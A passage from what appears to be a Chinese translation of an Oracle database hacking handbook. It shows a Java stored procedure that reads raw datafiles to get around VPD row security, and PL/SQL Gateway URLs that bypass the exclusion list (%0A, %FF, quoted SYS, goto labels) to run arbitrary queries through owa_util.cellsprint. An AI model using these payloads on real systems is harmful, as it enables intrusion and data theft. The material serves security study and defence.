class="line">                           cnt ++;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">             catch (EOFException eof)</span><br><span class="line">                   &#123;</span><br><span class="line">                   System.out.println();</span><br><span class="line">                   System.out.println(&quot;EOF reached &quot;);</span><br><span class="line">             &#125;</span><br><span class="line">             catch (IOException ioe)</span><br><span class="line">             &#123;</span><br><span class="line">                   System.out.println(&quot;IO error: &quot;+ ioe);</span><br><span class="line">             &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADBINFILEPROC (p_filename  IN</span><br><span class="line">VARCHAR2, p_start in number)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADBINFILE.readbinfile (java.lang.String, int)&#x27;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>创建后，您可以使用它直接读取文件 - 在这种情况下， VPDTESTTABLE 存在于 USERS 表空间中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt; exec dbms_java.set_output(2000);</span><br><span class="line">PL/SQL procedure successfully completed.</span><br><span class="line">SQL&gt; exec</span><br><span class="line">JAVAREADBINFILEPROC(&#x27;c:\\oracle\\oradata\\orcl10G\\USERS01.DBF&#x27;,3129184)</span><br><span class="line">;</span><br><span class="line">\x03\x1B\x01\x80\x02\x02\x2C\x01\x03\x0C\x55\x4E\x43\x4C\x41\x53</span><br><span class="line">\x53\x49\x46\x49\x45\x44\x0C\x50\x4F\x4C\x49\x53\x48\x20\x42\x4F</span><br><span class="line">\x4F\x54\x53\x05\x4D\x41\x4A\x4F\x52\x2C\x01\x03\x06\x53\x45\x43</span><br><span class="line">\x52\x45\x54\x11\x49\x4E\x56\x41\x44\x45\x20\x4F\x4E\x20\x54\x55</span><br><span class="line">\x45\x53\x44\x41\x59\x07\x43\x4F\x4C\x4F\x4E\x45\x4C\x2C\x01\x03</span><br><span class="line">\x0C\x55\x4E\x43\x4C\x41\x53\x53\x49\x46\x49\x45\x44\x10\x55\x50</span><br><span class="line"></span><br><span class="line">\x44\x41\x54\x45\x20\x44\x55\x54\x59\x20\x52\x4F\x54\x41\x08\x43</span><br><span class="line">\x4F\x52\x50\x4F\x52\x41\x4C\x2C\x01\x03\x06\x53\x45\x43\x52\x45</span><br><span class="line">\x54\x12\x43\x41\x50\x54\x55\x52\x45\x20\x45\x4E\x45\x4D\x59\x20</span><br><span class="line">\x42\x41\x53\x45\x07\x47\x45\x4E\x45\x52\x41\x4C\x06\x06\x1E\xE2</span><br><span class="line">\x06\xA2\x00\x00\x7E\x01\x00\x01\x1E\xE2\x1F\x00\x00\x00\x01\x04</span><br><span class="line">\xBE\x1E\x00\x00\x01\x00\x0B\x00\x17\xCB\x00\x00\x01\xE2\x1F\x00</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>PL/SQL 过程成功完成。 此输出包含加密数据 - 例如，从第 3 行的最后三个字节开始，我们有以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x53\x45\x43\x52\x45\x54\x11\x49\x4E\x56\x41\x44\x45</span><br><span class="line">S   E   C   R   E   T       I   N   V   A   D   E</span><br><span class="line">\x20\x4F\x4E\x20\x54\x55\x45\x53\x44\x41\x59</span><br><span class="line">    O   N       T   U   E   S   D   A   Y</span><br></pre></td></tr></table></figure><h3 id="一般特权"><a href="#一般特权" class="headerlink" title="一般特权"></a>一般特权</h3><p>我已经看到许多服务器已授予 PUBLIC DBMS_RLS 的执行权限，以及一些关于虚拟专用数据库的教程也是如此。 这不是一个好主意。 还有其他包应该有PUBLIC的执行权限，比如SYS.LTADM，它有一个叫做CREATERLSPOLICY的过程，直接调用DBMS_RLS.ADD_POLICY过程。 DBMS_FGA 显然是另一个。 WKSYS 拥有的 WK_ADM 可由 PUBLIC 执行并允许对策略进行有限的修改。</p><p>最后，如果有人可以授予自己 EXEMPT ACCESS POLICY 系统特权 - 例如，通过 SQL 注入缺陷 - 那么策略将不适用于他们。</p><h2 id="攻击Oracle-PL-SQL-Web应用程序"><a href="#攻击Oracle-PL-SQL-Web应用程序" class="headerlink" title="攻击Oracle PL/SQL Web应用程序"></a>攻击Oracle PL/SQL Web应用程序</h2><p>Oracle PL/SQL 网关提供了通过 Web 在 Oracle 数据库服务器中执行 PL/SQL 过程的能力。 它提供了一个网关，即从 Internet 到 Web 上的后端 Oracle 数据库服务器的路径。 当用户使用 Web 浏览器连接到运行 Oracle PL/SQL 网关的 Web 服务器时，网关只是将用户的请求代理到执行请求的数据库服务器。 Oracle PL/SQL 网关内置于 Oracle 门户、Oracle 应用程序、服务器和 Oracle HTTP 服务器。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/10.png"></p><h3 id="认识Oracle-PL-SQL网关"><a href="#认识Oracle-PL-SQL网关" class="headerlink" title="认识Oracle PL/SQL网关"></a>认识Oracle PL/SQL网关</h3><p><strong>PL/SQL 网关 URL</strong></p><p>PL/SQL Web 应用程序的 URL 通常很容易识别，并且通常以以下开头（xyz 可以是任何字符串并表示数据库访问描述符，稍后您将了解更多信息）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/xyz</span><br><span class="line">http://server.example.com/xyz/owa</span><br><span class="line">http://server.example.com/xyz/plsql</span><br></pre></td></tr></table></figure><p>虽然这些示例中的第二个和第三个表示来自旧版本 PL/SQL 网关的 URL，但第一个来自在 Apache 上运行的更新版本。 在 plsql.conf Apache 配置文件中，/pls 是默认值，指定为一个位置，PLS 模块作为处理程序。 但是，位置不必是 /pls。 URL 中缺少文件扩展名可能表明存在 Oracle PL/SQL 网关。 考虑以下 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/aaa/bbb/xxxxx.yyyyy</span><br></pre></td></tr></table></figure><p>如果 xxxxx.yyyyy 被替换为类似于“ebank.home”、“store.welcome”、“auth.login”或“books.search”的内容，那么 PL/SQL 网关很有可能是 正在使用。 您可以执行一些简单的测试来验证这一点，但在查看这些之前，让我们充分探索 URL 语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/pkg.proc</span><br></pre></td></tr></table></figure><p>在此 URL 中，xyz 是数据库访问描述符或 DAD。 DAD 指定有关数据库服务器的信息，以便 PL/SQL 网关可以连接。 它包含诸如 TNS 连接字符串、用户 ID 和密码、身份验证方法等信息。 这些 DAD 在更新版本中的 dads.conf Apache 配置文件或旧版本中的 wdbsvr.app 文件中指定。 一些默认 DAD 包括以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ORASSO</span><br><span class="line">PORTAL</span><br><span class="line">SIMPLEDAD</span><br><span class="line">SSODAD</span><br></pre></td></tr></table></figure><p>上面显示的URL中的pkg是存储在后端数据库服务器中的PL/SQL包的名称，proc是包导出的过程。 将 PL/SQL 包视为存在于 Oracle 数据库服务器中的程序的最佳方式，每个过程都公开了一些可以调用的功能。 例如，您可以编写一个 Calculator PL/SQL 包。 该包将被称为 CALC，它将具有调用 ADD、SUBTRACT、DIVIDE 和 MULTIPLY 的过程。 然后您可以通过 PL/SQL 网关执行这些过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/calc.add?x1=10&amp;y=20</span><br></pre></td></tr></table></figure><p>CALC包的源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">-- CALC PL/SQL Package</span><br><span class="line">-- create the package specification</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PACKAGE CALC IS</span><br><span class="line">      PROCEDURE ADD(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE SUBTRACT(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE DIVIDE(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE MULTIPLY(X NUMBER, Y NUMBER);</span><br><span class="line">END CALC;</span><br><span class="line">/</span><br><span class="line">-- create package&#x27;s body</span><br><span class="line">CREATE OR REPLACE PACKAGE BODY CALC IS</span><br><span class="line">      PROCEDURE ADD(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X + Y);</span><br><span class="line">      END ADD;</span><br><span class="line">      PROCEDURE SUBTRACT(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X - Y);</span><br><span class="line">      END SUBTRACT;</span><br><span class="line">      PROCEDURE DIVIDE(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X / Y);</span><br><span class="line">      END DIVIDE;</span><br><span class="line">      PROCEDURE MULTIPLY(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X * Y);</span><br><span class="line">      END MULTIPLY;</span><br><span class="line">END CALC;</span><br><span class="line">/</span><br><span class="line">GRANT EXECUTE ON CALC TO PUBLIC;</span><br></pre></td></tr></table></figure><p>这提出了一个有趣的观点：由于 CALC 包可能存在于许多模式中的任何一个模式中，网关如何“知道”去哪里查找？ 在 DAD 中指定的用户名通常表示模式，但请记住在开篇章节中网关就是这样：进入数据库的网关。 如果我们指定不同的模式，我们可以访问其他包。 假设 SCOTT 创建了 CALC 包，我们可以访问它——即使 DAD 中指定的模式是 FOO：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/SCOTT.calc.add?x1=10&amp;y=20</span><br></pre></td></tr></table></figure><p>这是 Oracle PL/SQL 网关的主要弱点之一。</p><p><strong>Oracle门户</strong></p><p>Oracle 门户应用程序构建在 Oracle PL/SQL 网关之上。 如果您看到类似的 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/portal/page?_pageid=number&amp;_dad=portal&amp;_schema</span><br><span class="line">=PORTAL</span><br></pre></td></tr></table></figure><p>然后服务器正在运行的网关。 将上述门户 URL 转换为网关 URL 需要您采用 dad 参数并将其附加到 /pls：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/portal/null</span><br></pre></td></tr></table></figure><h3 id="验证Oracle-PL-SQL网关是否存在"><a href="#验证Oracle-PL-SQL网关是否存在" class="headerlink" title="验证Oracle PL/SQL网关是否存在"></a>验证Oracle PL/SQL网关是否存在</h3><p>有时，应用程序使用 Oracle PL/SQL 网关可能并不明显。 本节介绍了一些可用于测试的方法。</p><p><strong>Web 服务器 HTTP 服务器响应头</strong></p><p>通过获取 HTTP Server 响应头，您通常可以判断 PL/SQL 网关是否存在。 以下是您可能会看到的一些有效回复：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Oracle-Application-Server-10g</span><br><span class="line">Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server</span><br><span class="line">Oracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server</span><br><span class="line">Oracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)</span><br><span class="line">Oracle-Application-Server-10g/9.0.4.0.0</span><br><span class="line"></span><br><span class="line">Oracle HTTP Server Powered by Apache</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0</span><br><span class="line"></span><br><span class="line">Oracle_Web_Listener/4.0.7.1.0EnterpriseEdition</span><br><span class="line">Oracle_Web_Listener/4.0.8.2EnterpriseEdition</span><br><span class="line">Oracle_Web_Listener/4.0.8.1.0EnterpriseEdition</span><br><span class="line">Oracle_Web_listener3.0.2.0.0/2.14FC1</span><br><span class="line"></span><br><span class="line">Oracle9iAS/9.0.2 Oracle HTTP Server</span><br><span class="line">Oracle9iAS/9.0.3.1 Oracle HTTP Server</span><br></pre></td></tr></table></figure><p>这些是通过搜索“inurl:plsql oracle”和“inurl:owa oracle”从谷歌上发现的服务器中获取的。</p><p>如果您不确定某个应用程序是否正在使用 Oracle PL/SQL 网关，您可以针对该信息执行一些快速测试。 如果应用程序正在使用网关，那么将过程设置为 NULL 应该会导致 Web 服务器返回一个空的 200 响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/dad/null</span><br></pre></td></tr></table></figure><p>发生这种情况是因为 PL/SQL 中的 NULL 相当于无操作； 如果你得到一个空正文的 200 响应，你可以推断无操作成功完成。</p><p>在网关的更高版本中，请求 OWA_UTIL.SIGNATURE 作为过程应该导致 403 Forbidden 响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/dad/owa_util.signature</span><br></pre></td></tr></table></figure><p>在这里，我们收到了禁止响应，因为此过程存在安全风险，并且 Oracle Portal 默认阻止对其进行访问。 如果您正在处理 Oracle Portal 的早期版本，从而可以获得对 OWA_UTIL 的访问，那么您应该得到类似于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;This page was produced by the PL/SQL Web Toolkit on date&quot;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;This page was produced by the PL/SQL Cartridge on date&quot;</span><br></pre></td></tr></table></figure><p><strong>Oracle PL/SQL 网关如何与数据库服务器通信</strong></p><p>使用 SQL*Plus 等标准客户端，普通用户可以执行 PL/SQL 过程，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; exec package.procedure(&#x27;foo&#x27;);</span><br></pre></td></tr></table></figure><p>或者，用户可以在匿名 PL/SQL 块中执行该过程，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; declare</span><br><span class="line">buff varchar2(20):=&#x27;foo&#x27;;</span><br><span class="line">begin</span><br><span class="line">package.procedure(buff);</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>PL/SQL 网关本质上做同样的事情。 它采用用户请求的包和过程的名称，并将其嵌入到 PL/SQL 的匿名块中，将其发送到数据库服务器以供执行。 随着时间的推移，匿名 PL/SQL 块的确切内容发生了变化，但如果我们请求 <a href="http://server/pls/dad/foo.bar?xyz=123%EF%BC%8C%E5%AE%83%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%83%8F%E8%BF%99%E6%A0%B7%EF%BC%9A">http://server/pls/dad/foo.bar?xyz=123，它看起来像这样：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1 declare</span><br><span class="line">2  rc__ number;</span><br><span class="line">3  start_time__ binary_integer;</span><br><span class="line">4  simple_list__ owa_util.vc_arr;</span><br><span class="line">5  complex_list__ owa_util.vc_arr;</span><br><span class="line">6 begin</span><br><span class="line">7  start_time__ := dbms_utility.get_time;</span><br><span class="line"></span><br><span class="line">8  owa.init_cgi_env(:n__,:nm__,:v__);</span><br><span class="line">9  htp.HTBUF_LEN := 255;</span><br><span class="line">10  null;</span><br><span class="line">11  null;</span><br><span class="line">12  simple_list__(1) := &#x27;sys.%&#x27;;</span><br><span class="line">13  simple_list__(2) := &#x27;dbms\_%&#x27;;</span><br><span class="line">14  simple_list__(3) := &#x27;utl\_%&#x27;;</span><br><span class="line">15  simple_list__(4) := &#x27;owa\_%&#x27;;</span><br><span class="line">16  simple_list__(5) := &#x27;owa.%&#x27;;</span><br><span class="line">17  simple_list__(6) := &#x27;htp.%&#x27;;</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if ((owa_match.match_pattern(&#x27;foo.bar&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   foo.bar(XYZ=&gt;:XYZ);</span><br><span class="line">25   if (wpg_docload.is_file_download) then</span><br><span class="line">26    rc__ := 1;</span><br><span class="line">27    wpg_docload.get_download_file(:doc_info);</span><br><span class="line">28    orasso.wpg_session.deinit();</span><br><span class="line">29    null;</span><br><span class="line">30    null;</span><br><span class="line">31    commit;</span><br><span class="line">32   else</span><br><span class="line">33    rc__ := 0;</span><br><span class="line">34    orasso.wpg_session.deinit();</span><br><span class="line">35    null;</span><br><span class="line">36    null;</span><br><span class="line">37    commit;</span><br><span class="line">38    owa.get_page(:data__,:ndata__);</span><br><span class="line">39   end if;</span><br><span class="line">40  end if;</span><br><span class="line">41  :rc__ := rc__;</span><br><span class="line">42  :db_proc_time__ := dbms_utility.get_time - start_time__;</span><br><span class="line">43 end;</span><br></pre></td></tr></table></figure><p>需要注意的关键行是 19 和 24。在第 19 行，根据已知的“坏”字符串列表检查用户的请求。 这构成了 PL/SQL 排除列表的一部分，稍后您将了解更多信息。 如果用户请求的包和过程不包含坏字符串，则过程在第 24 行执行。XYZ 参数作为绑定变量传递。 稍后您将学习如何操作您的请求，以便您可以在这个匿名块中嵌入任意 PL/SQL - 从而获得对其执行的后端数据库服务器的完全控制。</p><h3 id="攻击PL-SQL网关"><a href="#攻击PL-SQL网关" class="headerlink" title="攻击PL/SQL网关"></a>攻击PL/SQL网关</h3><p>本节着眼于攻击 PL/SQL 网关的方法。 完成此操作的方式取决于补丁级别。 并提供了对 Oracle 修补安全漏洞的方法的深入了解。</p><p><strong>PL/SQL 排除列表</strong></p><p>之前您看到了如何通过指定包所在的架构来访问任何过程（取决于权限）。 这存在明显的安全风险。 为了阻止这种风险，Oracle 引入了 PL/SQL ExclusionList。 此列表最初包含许多已知的错误字符串，这些字符串可能出现在攻击者发出的请求中。 该列表包含以下条目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OWA*</span><br><span class="line">SYS.*</span><br><span class="line">DBMS_*</span><br><span class="line">HTP.*</span><br><span class="line">HTF.*</span><br><span class="line">UTL_*</span><br></pre></td></tr></table></figure><p>由于这些攻击都存在已知的攻击，Oracle 希望阻止访问名称与这些条件匹配的包。 在过去的五年中，一些漏洞允许攻击者绕过 PL/SQL 排除列表并访问这些包。 例如，考虑 SYS 拥有的 OWA_UTIL 包。 这个包包含一个叫做 CELLSPRINT 的过程，它使攻击者能够运行任意 SELECT 查询。 在没有排除列表的服务器中，可以按如下方式执行查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>添加排除列表后，直接尝试访问此包将导致“403 Forbidden”响应。 但是，可以通过在包之前放置换行符来轻松绕过第一个补丁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/%0Aowa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>Oracle 对此进行了修补，但下一个修补程序也可能会失败。 这次的问题是由于后端数据库服务器将十六进制字节 0xFF 视为 Y，而网关没有。 因此，通过请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/S%FFS.owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>攻击者可以再次访问包 - %FF 被数据库转换为 Y，使模式名称为 SYS。 此问题是由国际化功能引起的。可以通过将模式名称括在双引号中来解决此问题的补丁：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/&quot; SYS&quot;.owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>这打破了模式匹配。 但是，这在 10g 应用程序服务器上不起作用，因为此版本的 PL/SQL 网关将所有大写字符转换为小写字符，将“SYS”请求为“sys”。 因此，Oracle 将无法找到包，因为带引号的标识符区分大小写。 但是，可以通过在包名称前插入 goto 标签来破坏 10g 应用程序服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/&lt;&lt;LBL&gt;&gt;owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure><p>可以通过在各个区域插入任意 SQL 元素来破坏下一个补丁。如果用户请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/FOO.BAR</span><br></pre></td></tr></table></figure><p>执行以下 PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">1 declare</span><br><span class="line">2  rc__ number;</span><br><span class="line">3  start_time__ binary_integer;</span><br><span class="line">4  simple_list__ owa_util.vc_arr;</span><br><span class="line">5  complex_list__ owa_util.vc_arr;</span><br><span class="line">6 begin</span><br><span class="line">7  start_time__ := dbms_utility.get_time;</span><br><span class="line">8  owa.init_cgi_env(:n__,:nm__,:v__);</span><br><span class="line">9  htp.HTBUF_LEN := 255;</span><br><span class="line">10  null;</span><br><span class="line">11  null;</span><br><span class="line">12  simple_list__(1) := &#x27;sys.%&#x27;;</span><br><span class="line"></span><br><span class="line">13  simple_list__(2) := &#x27;dbms\_%&#x27;;</span><br><span class="line">14  simple_list__(3) := &#x27;utl\_%&#x27;;</span><br><span class="line">15  simple_list__(4) := &#x27;owa\_%&#x27;;</span><br><span class="line">16  simple_list__(5) := &#x27;owa.%&#x27;;</span><br><span class="line">17  simple_list__(6) := &#x27;htp.%&#x27;;</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if ((owa_match.match_pattern(&#x27;foo.bar&#x27;, simple_list__,</span><br><span class="line">complex_list__,</span><br><span class="line">true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   foo.bar;</span><br><span class="line">25   if (wpg_docload.is_file_download) then</span><br><span class="line">26    rc__ := 1;</span><br><span class="line">27    wpg_docload.get_download_file(:doc_info);</span><br><span class="line">28    orasso.wpg_session.deinit();</span><br><span class="line">29    null;</span><br><span class="line">30    null;</span><br><span class="line">31    commit;</span><br><span class="line">32   else</span><br><span class="line">33    rc__ := 0;</span><br><span class="line">34    orasso.wpg_session.deinit();</span><br><span class="line">35    null;</span><br><span class="line">36    null;</span><br><span class="line">37    commit;</span><br><span class="line">38    owa.get_page(:data__,:ndata__);</span><br><span class="line">39   end if;</span><br><span class="line">40  end if;</span><br><span class="line">41  :rc__ := rc__;</span><br><span class="line">42  :db_proc_time__ := dbms_utility.get_time - start_time__;</span><br><span class="line">43 end;</span><br></pre></td></tr></table></figure><p>请注意，在第 19 行，根据可能源自攻击的已知“坏”值列表对请求的包和过程名称 FOO.BAR 进行检查。 除了检查简单列表中的字符串外，它还检查特殊字符。</p><p>如果用户然后请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/INJECT&#x27;POINT</span><br></pre></td></tr></table></figure><p>执行以下 PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if 